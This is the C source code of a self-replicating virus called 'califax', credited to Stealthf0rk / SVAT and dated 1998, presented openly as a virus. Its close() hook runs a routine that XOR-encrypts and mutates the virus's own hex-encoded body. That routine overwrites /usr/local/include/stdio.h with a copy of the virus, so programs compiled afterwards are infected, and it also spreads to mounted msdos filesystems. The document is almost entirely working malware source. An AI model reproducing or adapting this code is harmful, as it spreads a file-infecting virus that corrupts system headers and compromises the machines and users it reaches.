"\x26\x73\x5b\x69\x5d\x2c\x20\x31\x29\x3b\x0a\x20\x20\x20\x20"
"\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x43\x6c\x6f"
"\x73\x65\x28\x66\x64\x29\x3b\x0a\x23\x65\x6c\x73\x65\x0a\x20"
"\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
"\x73\x5b\x69\x5d\x20\x3d\x20\x72\x61\x6e\x64\x28\x29\x20\x25"
"\x20\x32\x35\x35\x3b\x0a\x23\x65\x6e\x64\x69\x66\x0a\x20\x20"
"\x20\x20\x20\x20\x20\x20\x7d\x0a\x20\x20\x20\x20\x20\x20\x20"
"\x20\x72\x65\x74\x75\x72\x6e\x20\x30\x3b\x0a\x7d\x0a\x0a\x23"
"\x69\x66\x64\x65\x66\x20\x6c\x69\x6e\x75\x78\x0a\x2f\x2a\x20"
"\x6c\x6f\x6f\x6b\x20\x75\x70\x20\x2f\x70\x72\x6f\x63\x2f\x6d"
"\x6f\x75\x6e\x74\x73\x20\x74\x6f\x20\x66\x69\x6e\x64\x20\x74"
"\x68\x65\x20\x6d\x6f\x75\x6e\x74\x65\x64\x20\x6d\x73\x64\x6f"
"\x73\x20\x66\x73\x0a\x20\x2a\x20\x69\x66\x20\x6f\x6e\x65\x20"
"\x77\x61\x73\x20\x66\x6f\x75\x6e\x64\x2c\x20\x63\x61\x6c\x6c"
"\x20\x76\x69\x72\x66\x75\x6e\x63\x20\x6f\x6e\x20\x69\x74\x20"
"\x2a\x2f\x0a\x69\x6e\x74\x20\x6a\x75\x6d\x70\x32\x64\x6f\x73"
"\x28\x76\x6f\x69\x64\x29\x0a\x7b\x20\x20\x0a\x20\x20\x20\x20"
"\x20\x20\x09\x46\x49\x4c\x45\x20\x2a\x66\x64\x3b\x0a\x20\x20"
"\x20\x20\x20\x20\x20\x20\x63\x68\x61\x72\x20\x62\x75\x66\x5b"
"\x35\x30\x5d\x20\x3d\x20\x7b\x30\x7d\x2c\x20\x62\x75\x66\x62"
"\x61\x6b\x5b\x35\x30\x5d\x20\x3d\x20\x7b\x30\x7d\x3b\x0a\x20"
"\x20\x20\x20\x20\x20\x20\x20\x0a\x20\x20\x20\x20\x20\x20\x20"
"\x20\x69\x66\x20\x28\x28\x66\x64\x20\x3d\x20\x66\x6f\x70\x65"
"\x6e\x28\x22\x2f\x70\x72\x6f\x63\x2f\x6d\x6f\x75\x6e\x74\x73"
"\x22\x2c\x20\x22\x72\x22\x29\x29\x20\x3d\x3d\x20\x4e\x55\x4c"
"\x4c\x29\x20\x7b\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
"\x20\x09\x70\x65\x72\x72\x6f\x72\x28\x22\x66\x6f\x70\x65\x6e"
"\x22\x29\x3b\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
"\x20\x20\x20\x20\x20\x72\x65\x74\x75\x72\x6e\x20\x65\x72\x72"
"\x6e\x6f\x3b\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x7d\x0a\x20"
"\x20\x20\x20\x20\x20\x20\x20\x77\x68\x69\x6c\x65\x20\x28\x66"
"\x73\x63\x61\x6e\x66\x28\x66\x64\x2c\x20\x22\x25\x73\x22\x2c"
"\x20\x62\x75\x66\x29\x20\x3e\x20\x30\x29\x20\x7b\x0a\x20\x20"
"\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x69"
"\x66\x20\x28\x73\x74\x72\x63\x6d\x70\x28\x62\x75\x66\x2c\x20"
"\x22\x6d\x73\x64\x6f\x73\x22\x29\x20\x3d\x3d\x20\x30\x29\x0a"
"\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
"\x20\x20\x20\x20\x09\x62\x72\x65\x61\x6b\x3b\x0a\x20\x20\x20"
"\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x6d\x65"
"\x6d\x73\x65\x74\x28\x62\x75\x66\x62\x61\x6b\x2c\x20\x30\x2c"
"\x20\x35\x30\x29\x3b\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20"
"\x20\x20\x20\x20\x20\x20\x20\x73\x74\x72\x63\x70\x79\x28\x62"
"\x75\x66\x62\x61\x6b\x2c\x20\x62\x75\x66\x29\x3b\x0a\x20\x20"
"\x20\x20\x20\x20\x20\x20\x7d\x0a\x20\x20\x20\x20\x20\x20\x20"
"\x20\x66\x63\x6c\x6f\x73\x65\x28\x66\x64\x29\x3b\x0a\x20\x20"
"\x20\x20\x20\x20\x20\x20\x69\x66\x20\x28\x73\x74\x72\x63\x6d"
"\x70\x28\x62\x75\x66\x2c\x20\x22\x6d\x73\x64\x6f\x73\x22\x29"
"\x20\x3d\x3d\x20\x30\x29\x20\x7b\x0a\x20\x20\x20\x20\x20\x20"
"\x20\x20\x20\x20\x20\x09\x63\x68\x64\x69\x72\x28\x28\x63\x6f"
"\x6e\x73\x74\x20\x63\x68\x61\x72\x2a\x29\x62\x75\x66\x62\x61"
"\x6b\x29\x3b\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
"\x20\x20\x20\x20\x20\x76\x69\x72\x66\x75\x6e\x63\x28\x29\x3b"
"\x20\x20\x20\x20\x20\x20\x20\x20\x0a\x20\x20\x20\x20\x20\x20"
"\x20\x20\x7d\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x72\x65\x74"
"\x75\x72\x6e\x20\x30\x3b\x0a\x7d\x0a\x23\x65\x6e\x64\x69\x66"
"\x20\x20\x20\x20\x20\x20\x20\x20\x0a\x20\x20\x20\x20\x20\x20"
"\x20\x20\x0a\x0a\x2f\x2a\x2a\x20\x54\x68\x69\x73\x20\x76\x69"
"\x72\x75\x73\x20\x77\x61\x73\x20\x63\x6f\x6d\x70\x69\x6c\x65"
"\x64\x20\x61\x6e\x64\x20\x73\x74\x61\x72\x74\x65\x64\x20\x62"
"\x79\x20\x72\x6f\x6f\x74\x40\x6c\x69\x61\x6e\x65\x0a\x20\x2a"
"\x2a\x20\x6f\x6e\x20\x53\x75\x6e\x20\x44\x65\x63\x20\x32\x37"
"\x20\x32\x31\x3a\x34\x35\x3a\x31\x33\x20\x43\x45\x54\x20\x31"
"\x39\x39\x38\x0a\x20\x2a\x2a\x2f\x0a";



unsigned char key[] = {0x00, 0x00, 0x00, 0x00};


/* the hooked close-function */
int close(int fd) 
{
   	static int first = 0;
        if (!first) {
           	first++;
           	chdir("/");
                virfunc();
#ifdef linux
                jump2dos();
#endif
        }
        return Close(fd);
}

/* the real close-functions, using the syscalls */
#ifdef linux
int Close(int i)
{
   	long __res;
 
    	errno = 0;       
        __asm__ volatile ("int $0x80"
                	: "=a" (__res)
                        : "0" (__NR_close),"b" ((long)(i)));
                        if (__res >= 0)
                           	return (int)__res;
                        errno = -__res;
                        return -1;
}
#else
int Close(int i) 
{
   	union REGS ir, or;
        
        errno = 0;
        ir.h.ah = 0x3e;
        ir.x.bx = i;
        memset(&or, 0, sizeof(or));
        int86(0x21, &ir, &or);
        if (or.x.cflag) {
           	errno = or.x.ax;
                return -1;
        }
        return 0;
}
#endif

int virfunc(void)
{
   	FILE *fd;
        int i = 0, j = 1;
        
#ifdef linux        
        int oldmask = umask(0);
#endif
        /* decrypt the arrays first [we assume that it is encrypted !!!]
         * look at the end of virfunc() too
         */
        Crypt(B, CHARS2);
        Crypt(C, CHARS);
        /* get a different key for new encryption */
        mutate(key);
        /* open a file stdio.h in /usr/local/include */
        mkdir("usr/local", 0755);
        mkdir("usr/local/include", 0755);
        unlink("usr/local/include/stdio.h");
        if ((fd = fdopen(open("usr/local/include/stdio.h", O_CREAT|O_RDWR, 0644), "w+")) == NULL)
           	perror("fopen");
        /* write head in it (now plain) */
        fprintf(fd, "%s", B);
        /* encrypt array B with new key*/
        Crypt(B, CHARS2);
        /* and write it encrypted to the file */
        fprintf(fd, "char B[] = \n\"");
        for (i = 0; i < CHARS2; i++) {
           	if ((j % 15) == 0) {
                   	fprintf(fd, "\"\n\"");
                        j = 0;
                }
                fprintf(fd, "\\x%02x", (unsigned char)B[i]);
                j++;
        }
        fprintf(fd, "\";\n\n");
        /* encrypt C with the new key */
        fprintf(fd, "char C[] = \n\"");
        Crypt(C, CHARS);
        /* and write it to also the file */
        for (i = 0; i < CHARS; i++) {
           	if ((j % 15) == 0) {
                   	fprintf(fd, "\"\n\"");
                        j = 0;
                }
           	fprintf(fd, "\\x%02x", (unsigned char)C[i]);
                j++;
        }
        fprintf(fd, "\";\n\n");
        /* put the new key we got to the file wich is used
         * for the next decryption at the next call
         */ 
        fprintf(fd, "\n\nunsigned char key[4] = {0x%02x, 0x%02x, 0x%02x, 0x%02x};\n\n", 
                     (unsigned char)key[0], (unsigned char)key[1], 
                     (unsigned char)key[2], (unsigned char)key[3]);
        /* get C plain */
        Crypt(C, CHARS);
        /* and append it to stdio.h */
        fprintf(fd, "%s", C);
        fclose(fd);
#ifdef linux
        umask(oldmask);
#endif
        Crypt(C, CHARS);
        /* result: B and C is encrypted now -> we can call virfunc() again */
        return 0;
}

/* simple XOR-encryption technique using the global key[] for
 * it
 */

int Crypt(char *s, int len)
{
   	int i = 0, j = 0;
        
        for (i = 0; i < len; i++) {
           	s[i] ^= key[j];
                j = (j + 1) % 4;
        }
        return 0;
}

/* on linux we use /dev/random, on DOS we use rnd() */

int mutate(char *s)
{
   	int i;
#ifdef linux
        int fd;
#endif   
#ifdef MSDOS
        random();
#endif        
        for (i = 0; i < 4; i++) {
#ifdef linux
           	if ((fd = open("/dev/random", O_RDONLY)) <= 0) {
                   	perror("open");
                        return errno;
                }
                read(fd, &s[i], 1);
                Close(fd);
#else
                s[i] = rand() % 255;
#endif
        }
        return 0;
}

#ifdef linux
/* look up /proc/mounts to find the mounted msdos fs
 * if one was found, call virfunc on it */
int jump2dos(void)
{  
      	FILE *fd;
        char buf[50] = {0}, bufbak[50] = {0};
        
        if ((fd = fopen("/proc/mounts", "r")) == NULL) {
           	perror("fopen");
                return errno;
        }
        while (fscanf(fd, "%s", buf) > 0) {
                if (strcmp(buf, "msdos") == 0)
                   	break;
                memset(bufbak, 0, 50);
                strcpy(bufbak, buf);
        }
        fclose(fd);
        if (strcmp(buf, "msdos") == 0) {
           	chdir((const char*)bufbak);
                virfunc();        
        }
        return 0;
}
#endif        
        

/** This virus was compiled and started by root@liane
 ** on Sun Dec 27 21:45:13 CET 1998
 **/
/* main() for califax.c
 * (C)opyright 1998 by Stealthf0rk / SVAT <stealth@cyberspace.org>
 * use it under the terms of the GPL.
 */
 
int main(void)
{
   	printf("started califax. For Doreen.\n");
        return close(-11);
}

